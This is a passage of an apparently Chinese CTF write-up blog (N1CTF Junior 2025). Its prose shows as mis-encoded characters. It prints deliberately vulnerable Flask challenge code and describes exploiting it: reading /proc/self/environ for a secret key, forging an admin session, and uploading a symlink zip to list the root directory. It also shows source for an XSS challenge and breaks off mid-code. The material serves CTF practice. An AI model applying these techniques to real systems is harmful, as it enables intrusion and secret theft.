class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username            session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"æœªé€‰æ‹©æ–‡ä»¶"</span>        role <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            dirname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"dirname"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            dirname <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> dirname<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        zip_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> <span class="token string">"upload.zip"</span><span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"unzip -o </span><span class="token interpolation"><span class="token punctuation">&#123;</span>zip_path<span class="token punctuation">&#125;</span></span><span class="token string"> -d </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼"</span>        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"è§£å‹å®Œæˆï¼&lt;br>ä¸‹è½½åœ°å€: &lt;a href='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">(</span><span class="token string">'download'</span><span class="token punctuation">,</span> folder<span class="token operator">=</span>dirname<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'></span><span class="token interpolation"><span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span>host_url<span class="token punctuation">&#125;</span></span><span class="token string">download/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>"</span></span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/&lt;folder>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>folder<span class="token punctuation">)</span><span class="token punctuation">:</span>    target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> folder<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"download.html"</span><span class="token punctuation">,</span> folder<span class="token operator">=</span>folder<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/&lt;folder>/&lt;filename>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>folder<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> folder <span class="token punctuation">,</span>filename<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>            content<span class="token punctuation">,</span>            mimetype<span class="token operator">=</span><span class="token string">"application/octet-stream"</span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"Content-Disposition"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"attachment; filename=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹æ¥ key åº”è¯¥æ˜¯åœ¨ç¯å¢ƒå˜é‡é‡Œï¼ŒåŒæ ·çš„æ–¹æ³•è¯» &#x2F;proc&#x2F;self&#x2F;environ æ‹¿åˆ° <code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!</code></p><p>ä¿®æ”¹ session çš„ role ä¸º adminï¼Œæˆä¸ºç®¡ç†å‘˜åå¯æŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„ä½ç½®</p><p>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æ€ä¹ˆåˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªæ ¹ç›®å½•çš„è½¯é“¾æ¥åˆ° uploads ä¸‹ï¼Œç„¶åå†ä¸Šä¼ ä¸€æ¬¡ï¼ŒæŒ‡å®šä½ç½®ä¸ºè½¯é“¾æ¥åå³å¯</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121806888.png"></p><p>ä¸Šä¼ åˆ°æ ¹ç›®å½•çš„è½¯é“¾æ¥ torootpathï¼ˆè¿™é‡Œæ˜¯ä¹‹å‰æŒ‡å®š dirname ä¸º <code>.</code>ï¼Œäºæ˜¯å¯ä»¥æŸ¥çœ‹ uploads ç›®å½•çš„å†…å®¹ï¼‰</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121827451.png"></p><p>ç„¶åå†ä¸Šä¼ ä¸€æ¬¡ï¼ŒæŒ‡å®š dirname ä¸º torootpathï¼Œä½¿å…¶è§†ä¸ºç›®å½•è®¿é—®</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121920087.png"></p><p>åˆ—å‡ºæ ¹ç›®å½•</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913122056484.png"></p><p>è®¿é—®å³å¯å¾—åˆ° flag</p><p>åšå®Œäº†æ‰å‘ç°åé¢ä¸Šäº†é™„ä»¶</p><hr><h1 id="Unfinishedï¼ˆå¤ç°ï¼‰"><a href="#Unfinishedï¼ˆå¤ç°ï¼‰" class="headerlink" title="Unfinishedï¼ˆå¤ç°ï¼‰"></a>Unfinishedï¼ˆå¤ç°ï¼‰</h1><p>æ˜æ˜¾è¦ xss</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> LoginManager<span class="token punctuation">,</span> UserMixin<span class="token punctuation">,</span> login_user<span class="token punctuation">,</span> logout_user<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_required<span class="token keyword">import</span> requests<span class="token keyword">from</span> markupsafe <span class="token keyword">import</span> escape<span class="token keyword">from</span> playwright<span class="token punctuation">.</span>sync_api <span class="token keyword">import</span> sync_playwright<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'your-secret-key-here'</span>login_manager <span class="token operator">=</span> LoginManager<span class="token punctuation">(</span><span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>login_view <span class="token operator">=</span> <span class="token string">'login'</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>UserMixin<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> bio<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>bio <span class="token operator">=</span> bioadmin_password <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>USERS_DB <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'admin'</span><span class="token punctuation">:</span> User<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">,</span> password<span class="token operator">=</span>admin_password<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>USER_ID_COUNTER <span class="token operator">=</span> <span class="token number">1</span><span class="token decorator annotation punctuation">@login_manager<span class="token punctuation">.</span>user_loader</span><span class="token keyword">def</span> <span class="token function">load_user</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> USERS_DB<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">==</span> user_id<span class="token punctuation">:</span>            <span class="token keyword">return</span> user    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> USER_ID_COUNTER    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> USERS_DB<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Username already exists.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                USER_ID_COUNTER <span class="token operator">+=</span> <span class="token number">1</span>        new_user <span class="token operator">=</span> User<span class="token punctuation">(</span>            <span class="token builtin">id</span><span class="token operator">=</span>USER_ID_COUNTER<span class="token punctuation">,</span>            username<span class="token operator">=</span>username<span class="token punctuation">,</span>            password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span>        USERS_DB<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> new_user        login_user<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'ticket'</span><span class="token punctuation">,</span> <span class="token string">'your_ticket_value'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>            login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'Invalid credentials.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        current_user<span class="token punctuation">.</span>bio <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'bio'</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>current_user<span class="token punctuation">.</span>bio<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ticket'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        ticket <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'ticket'</span><span class="token punctuation">]</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'ticket'</span><span class="token punctuation">,</span> ticket<span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'ticket.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/view"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">view_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    # I found a bug in it.    # Until I fix it, I've banned /api/bio/. Have fun :)    """</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>default<span class="token operator">=</span>current_user<span class="token punctuation">.</span>username<span class="token punctuation">)</span>    visit_url<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://localhost/api/bio/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""    &#123;&#123;% extends "base.html" %&#125;&#125;    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;    &#123;&#123;% block content %&#125;&#125;    &lt;h1>bot will visit your bio&lt;/h1>    &lt;p style="margin-top: 1.5rem;">&lt;a href="&#123;&#123;&#123;&#123; url_for('index') &#125;&#125;&#125;&#125;">Back to Home&lt;/a>&lt;/p>    &#123;&#123;% endblock %&#125;&#125;    """</span></span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/bio/&lt;string:username>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">get_user_bio</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span>    user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> user<span class="token punctuation">.</span>bio<span class="token keyword">def</span> <span class="token function">visit_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        flag_value <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">,</span> <span class="token string">'flag&#123;fake&#125;'</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> sync_playwright<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>            browser <span class="token operator">=</span> p<span class="token punctuation">.</span>chromium<span class="token punctuation">.</span>launch<span class="token punctuation">(</span>headless<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            context <span class="token operator">=</span> browser<span class="token punctuation">.</span>new_context<span class="token punctuation">(</span><span class="token punctuation">)</span>            context<span class="token punctuation">.</span>add_cookies<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>                <span class="token string">'value'</span><span class="token punctuation">:</span> flag_value<span class="token punctuation">,</span>                <span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>                <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>                <span class="token string">'httponly'</span><span class="token punctuation">:</span> <span class="token boolean">True</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            page <span class="token operator">=</span> context<span 